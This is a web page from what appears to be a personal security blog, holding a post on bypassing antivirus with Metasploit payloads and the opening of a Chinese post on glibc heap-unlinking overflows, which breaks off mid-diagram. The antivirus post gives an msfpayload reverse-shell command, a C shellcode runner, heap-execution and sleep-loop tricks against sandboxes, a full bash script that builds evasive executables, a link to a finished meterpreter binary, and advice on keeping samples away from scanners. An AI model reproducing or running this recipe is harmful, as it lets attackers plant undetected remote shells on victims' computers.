<p>So, that’s strange. How heuristic works? </p>
<p>After search on google, I find that kaspersky’s heuristic engine may check the windows api call of a program without running it. I remember <em>Metasploit: Low Level View</em> once said:</p>
<blockquote>
<p>Two effective methods are used to detect Polymorphic and Metamorphic</p>
<p>malware are :</p>
<p>− SAVE</p>
<p>on SAVE method a sequence of windows API calls are checked which<br>represent the signature of a malware. To decide whether a file is infected or<br>not; The ecludian distance between every API call is calculated. And if the<br>avg. of the API calls distances is less than 10% then a file is flagged as<br>infected. This implies on the (disk-level) injected code probably to be<br>detected</p>
<p>− Semantic aware</p>
<p>Here signatures are represented as control flow or tuples on instruction, on<br>disk-level a program is disassembled and a control flow is generated and<br>then compared to the signatures control flows and decided whether a<br>program is infected or not.</p>
</blockquote>
<p>No matter which method, you can simply disassemble metasploit’s payload and add some strange calls or jmps to confuse the heuristic engine. And I succeed fool Kaspersky just with a little simple <code>loop</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    push ecx&#10;    add ecx,0x100&#10;    push eax&#10;xxx:&#10;    imul eax, 0x100&#10;    xor eax, eax&#10;    loop xxx</span><br></pre></td></tr></table></figure>
<p>The next section is my experiment and some scan report.</p>
<h2 id="Experiment_on_bypass_Antivirus_software">Experiment on bypass Antivirus software</h2><p>I want to bypass all av with metasploit generated payload. this is my program template to inject payload:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* shellprogram.c */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">"&lt;payload here&gt;"</span></span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> (*exeshell)();</span><br><span class="line">    exeshell = (<span class="keyword">int</span> (*)()) code;</span><br><span class="line">    (<span class="keyword">int</span>)(*exeshell)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>To avoid the signature detection of the well-known metasploit payload, You can disassemble it and add random non-sense instructions(for example， push and pop) to make the binary different from the original one. You can simply write a script to automatic this like I do.[^2] Finally, get the new C style shellcode.</p>
<pre><code><span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ ~/</span>metasploit-framework<span class="regexp">/msfpayload windows/</span>shell/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; shell_reverse_raw
<span class="regexp">~/Work/</span>project/bypassav ⮀ python ndisasm.py shell_reverse_raw &gt; ghost-writing.asm
<span class="regexp">~/Work/</span>project/bypassav ⮀ nasm ghost-writing.asm -o <span class="keyword">new</span>
<span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ od -tx1 test.o | cut -c8-80 | sed -e 's/</span> <span class="regexp">/\\x/</span>g<span class="string">' | sed -e '</span>s<span class="regexp">/^/</span><span class="string">"/g' | sed -e 's/$/"</span>/g<span class="string">'</span>
</code></pre><p>Bypass all AVs’ detection is a challenge, for to avoid one AV you may trigger another one. The program above will bypass most but Asquared.</p>
<p>Why? I try to remove my shellcode just test the template, It will still be marked by avs. You can check the report <a href="http://vscan.novirusthanks.org/analysis/684ebdecaf29c41841833d9738c4ccac/Yy1ub25lLWV4ZQ==/" target="_blank" rel="external">here</a> and <a href="http://r.virscan.org/report/d35e77a1472bea0119ca8d1ec56d7b1a.html" target="_blank" rel="external">here</a></p>
<p>So it looks like execute from the data section is suspicious! There must many people use this tricks!</p>
<p>So I decided to copy it to heap and execute shellcode from heap.</p>
<p><a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">No shellcode and execute from heap</a>, No AV mark it as malicious. Another <a href="https://www.metascan-online.com/en/scanresult/file/dc5c7080fc44495f880facfdfc2b9eb1" target="_blank" rel="external">Report here</a></p>
<p>So, move your modified shellcode(You must Modified it so won’t be checked before execution) to heap and execute from heap. However, some AVs can detect it, here’s the <a href="https://www.metascan-online.com/en/scanresult/file/e3442be2dd0f4a089a2c16db2d387880" target="_blank" rel="external">report</a> and <a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">another one</a>.</p>
<p>make the modified upsidedown won’t bypass it and the name it marked never change. So I doubt these avs use sandbox to detect my shellcode.</p>
<p>So I add some sleep/for-loop to fool them. As mentioned earlier, you’d better try more find a slitely deferent way to fool them. It may work, but it may trigger other detection technichs.</p>
<p>After several tries and errors, I bypass all but Kaspersky. After several tries I know its not sandbox and signature. Then the story has been write earlier in this article.</p>
<p>The final bypass all report is <a href="https://www.metascan-online.com/en/scanresult/file/df3906541f8846f9a5ef38c7e31505e9" target="_blank" rel="external">here</a> You can download from <a href="https://github.com/reverland/scripts/blob/master/exe/hahaha.exe" target="_blank" rel="external">here</a> to check it(LHOST 192.168.56.102, windows/meterpreter/reverse_tcp, LPORT=4444, md5sum listed is in metascan)</p>
<p>Another thing to mention, I just upload it to virusnothanks when I did my experiments, for I don’t want to make the experiment uncerntainly. But now upload to anywhere is ok. If you want to do some experiments for several days, do not upload it to virustotal or metascan or viruscan and so on. You suspicious payload will be marked in one day.(Kaspersky really mark my payload in one day!)</p>
<p>I finally write scripts which generate random instructions for assemble language, encrypt or simply upsidedown shellcodes and automatic the whole process to facilitate my work. you can try one yourself. Similar to this one:</p>
<pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#! /bin/env bash</span></span><br><span class="line">nasm -fbin <span class="string">"<span class="variable">$1</span>"</span> -o test.o</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line">/* shellprogram.c */</span><br><span class="line">char code[] = </span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">LEN=`wc -c test.o| cut <span class="operator">-d</span><span class="string">' '</span> <span class="operator">-f</span>1`</span><br><span class="line">python upsidedown.py test.o</span><br><span class="line">od -tx1 test.o | cut -c8-<span class="number">80</span> | sed <span class="operator">-e</span> <span class="string">'s/ /\\x/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/^/"/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/$/"/g'</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\"\";"</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">int add(int);</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int i, len, s;</span><br><span class="line">  char *p;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">str=<span class="string">'len = '</span><span class="variable">$&#123;LEN&#125;</span><span class="string">';'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str&#125;</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">  p = (char *)malloc(len);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">  s = add(i);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      p[i] = code[len - <span class="number">1</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    int (*exeshell)();</span><br><span class="line">    exeshell = (int (*)()) p;</span><br><span class="line">    (int)(*exeshell)();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">int add(int num)</span><br><span class="line">&#123;</span><br><span class="line">static int sn;</span><br><span class="line">sn+=num;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">10000</span>) <span class="built_in">return</span> sn;</span><br><span class="line">add(++num);</span><br><span class="line">&#125;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># test.rc</span></span><br><span class="line">cat &gt;&gt; test.rc &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="number">1</span> ICON <span class="string">"test.ico"</span></span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcc.exe test.c -o test.obj</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lrc.exe test.rc /otest.res</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcclnk.exe test.obj test.res -o test.exe</span><br><span class="line">i686-pc-mingw32-strip test.exe</span><br><span class="line"></span><br><span class="line">rm test.o</span><br><span class="line">rm test.rc</span><br><span class="line">rm test.obj</span><br><span class="line">rm test.res</span><br><span class="line">rm test.c</span><br><span class="line"><span class="comment">#rm test_encode.o</span></span><br><span class="line"><span class="comment">#wine test.exe</span></span><br><span class="line"><span class="comment">#rm test.exe</span></span><br></pre></td></tr></table></figure></span>
</code></pre><h2 id="Conclusion">Conclusion</h2><p>Theory about how AV detect are easy to understand and bypass, but AV vendors will also exert to detect malwares. Some may useful, some may outdated. These techs are sprayed among the Reference section, you can also google more. I don’t talk about it much. The world is changing quickly(especially for security), check it by yourselves.</p>
<p>Finally you will see, the most effective way to avoid any AV, however, is to write your own tools or use them your own way. All you need is just to be creative. </p>
<p>Last, I’ll recommend <a href="https://github.com/ChrisTruncer/Veil/" target="_blank" rel="external">Veil</a> to you. It’s really a amazing tool for penetration testers.</p>
<p>Lastly, Chinese: 英文作文真难写……</p>
<h2 id="Reference">Reference</h2><p>You can find more below and special thanks to them:</p>
<ul>
<li><a href="http://funoverip.net/2011/04/100pc-anti-virus-evasion-with-metasploit-browser-exploits-from-ms11-003/" target="_blank" rel="external">100% Anti-Virus evasion with Metasploit browser exploits(example with ms11-003)</a></li>
<li><a href="http://pen-testing.sans.org/blog/pen-testing/2013/07/12/anti-virus-evasion-a-peek-under-the-veil" target="_blank" rel="external">Anti-Virus Evasion: A Peek Under the Veil</a></li>
<li><a href="http://spareclockcycles.org/tag/antivirus-evasion/" target="_blank" rel="external">Avoiding AV Detection</a></li>
<li><a href="http://www.commonexploits.com/?p=789" target="_blank" rel="external">AV0id – Anti-Virus Bypass Metasploit Payload Generator Script</a></li>
<li><a href="http://www.abysssec.com/blog/2011/09/25/bypassing-all-anti-virus-in-the-world-good-bye-detection-hello-infection/" target="_blank" rel="external">bypassing all anti-virus in the world (Good Bye Detection , Hello Infection)</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html" target="_blank" rel="external">Msfencode a Msfpayload Into An Existing Executable</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html" target="_blank" rel="external">Process Injection Outside of Metasploit</a></li>
<li><a href="http://pen-testing.sans.org/resources/papers/gcih/effectiveness-antivirus-detecting-metasploit-payloads-106563" target="_blank" rel="external">Effectiveness of Antivirus in Detecting Metasploit’s Payloads</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2013/01/17/evading-anti-virus-detection--whiteboard-wednesday" target="_blank" rel="external">Evading Anti-Virus Detection - Whiteboard Wednesday</a></li>
<li><a href="http://schierlm.users.sourceforge.net/avevasion.html" target="_blank" rel="external">Facts and myths about antivirus evasion with Metasploit</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions" target="_blank" rel="external">The Odd Couple: Metasploit and Antivirus Solutions</a></li>
<li><a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/" target="_blank" rel="external">Using Metasm To Avoid Antivirus Detection (Ghost Writing ASM)</a></li>
<li><a href="http://pen-testing.sans.org/blog/2011/10/13/tips-for-evading-anti-virus-during-pen-testing" target="_blank" rel="external">Tips for Evading Anti-Virus During Pen Testing</a></li>
<li><a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">Why Encoding Does not Matter and How Metasploit Generates EXE’s</a></li>
<li><a href="http://www.exploit-db.com/download_pdf/17968" target="_blank" rel="external">Evading Antimalware Engines via Assembly Ghostwriting</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_63a4534c01012ugj.html" target="_blank" rel="external">分析卡巴斯基启发式扫描及其绕过方案(Chinese)</a></li>
</ul>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: Example comes from <a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/</a><br>[^2]: Thanks to the article on <a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/#comment-513" target="_blank" rel="external">Pentest Geek</a>, however, nasm may a better choice. for there won’t be piles of <code>db</code>s</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/08/03/heap-unlinking/" itemprop="url">
                  堆溢出之Heap Unlinking
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-03T00:00:00+08:00" content="2013-08-03">
              2013-08-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/08/03/heap-unlinking/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/08/03/heap-unlinking/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>加上原书写得非常简略晦涩，很多内容我是一知半解的，在这里就不继续这部分了</p>
<p>红黑联盟网站中<a href="http://www.2cto.com/Article/201112/113697.html" target="_blank" rel="external">shellcode之五：堆溢出</a>一文关于shellcoder’s handbook堆溢出部分评价</p>
<p>这块那本善良人手册写得实在是太晦涩了，我实在是没看懂</p>
<p><a href="http://oilbeater.com/2012/06/12/stackoverflow-and-heapoverflow/" target="_blank" rel="external">Oilbeater 的部落格</a>上关于shellcoder‘s handbook堆溢出部分评价</p>
</blockquote>
<p>好吧，某个夏夜里对着计算机发了半个小时的呆也没有看懂作者在干什么。本来在挖财宝书中听说在linux下现在想Unlinking几乎不可能了，确实经过实验我的机器会抛出<code>sigabrt</code>之类的异常强行终止程序。不过探寻和了解下先前的黑客们如何不按规矩做事是很有意思的事情。最后上网搜了搜算是弄明白些了。现记如下，希望对其他人有帮助。</p>
<p>很悲剧的是，接下来我要说的还是只关乎linux的事情，关于windows下的堆溢出搞得似乎很复杂，对windows一窍不通的我只能看着复杂的各种结构长叹一口气，默默隐去，深藏功与名。</p>
<h2 id="已分配和可分配内存结构">已分配和可分配内存结构</h2><p>先说堆溢出为什么会发生在linux下，在glibc中有一个内存分配的malloc实现，linux下系统分配内存则是通过malloc调用brk和mmap来实现的。好吧，具体怎么实现先不管它[^1]，就当它一块一块的把内存分配出来，并将元数据和内存数据放在一起。</p>
<p>首先声明：下面所有的ascii图每行都是四个字节，然后地址由上向下递增。</p>
<p>内存的元数据和实际的数据保存在同一个内存空间中，已经分配的一块内存块以下结构存储，其它已经分配的内存块会接着它继续在内存空间中以相同方式分配。</p>
<pre><code><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">上一个块的大小</span>   &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
  <span class="comment">本块的大小</span>     &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">实际</span>         &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">内存会被显示的地址</span>
    <span class="comment">分配</span>         &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">区域3</span>  
    <span class="comment">内存</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
</code></pre><p>这些内存分配时肯定是该死的8字节对齐，这样检索起来似乎更快效率更高。那么，这些表示块的尺寸一定是8的倍数，那么，区域1和2中所保存的尺寸信息一定是8的倍数，就是说，最低位(8 = 0b1000)<a href="一块内存最小是16字节，反正最后一位为0">^2</a>一定是0。为了充分利用每一位内存，伟大的设计者们把这一位就设定为一个特殊的标记位，为了标记是否上一块内存正在使用(已分配)。</p>
<p>下图是区域2详解：</p>
<pre><code>+++++++++++++++
本块大小(最后一位是标记位)
+++++++++++++++
</code></pre><p>未被分配的内存块则是一种稍微不同的结构</p>
<pre><code>+++++++++++++++++++++++++
       上一块大小
+++++++++++++++++++++++++
<span class="header">        本块大小
+++++++++++++++++++++++++</span>
<span class="header">指向下一块自由块地址的指针  &lt;-- fd
+++++++++++++++++++++++++</span>
<span class="header">指向上一块自由块地址的指针  &lt;-- bk
+++++++++++++++++++++++++</span>
<span class="code">    未使用的区块部分</span>
<span class="code">    ......</span>
<span class="header">    ......
+++++++++++++++++++++++++</span>
</code></pre><p>好的，现在我们知道内存块的结构了，现在看看free是如何释放内存的。</p>
<h2 id="遍历内存">遍历内存</h2><p>现在看看内存块如何被遍历。</p>
<p>malloc实现从当前内存地址加上当前内存块的大小，得到下一个块的地址。</p>
<p>于是我们可以通过覆盖关于尺寸的元数据可以误导malloc让它以为我们指定的地方是下一个内存块。</p>
<h2 id="判断自由块">判断自由块</h2><p>malloc通过检查下一个内存块的头部标志位，来判定当前内存块是否是自由块。</p>
<h2 id="Unlink">Unlink</h2><p>当某个内存块被释放，内存空间中连续出现两个可分配的未使用内存块时(也就是说下一块内存块表现的是自由块)，malloc实现会将它整理为一大块连续的内存块。在整理之前假设内存如下图：</p>
<pre><code><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">第一个自由块开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk1</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>   
       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">第二个自由块开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk2</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
    <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
        <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>   
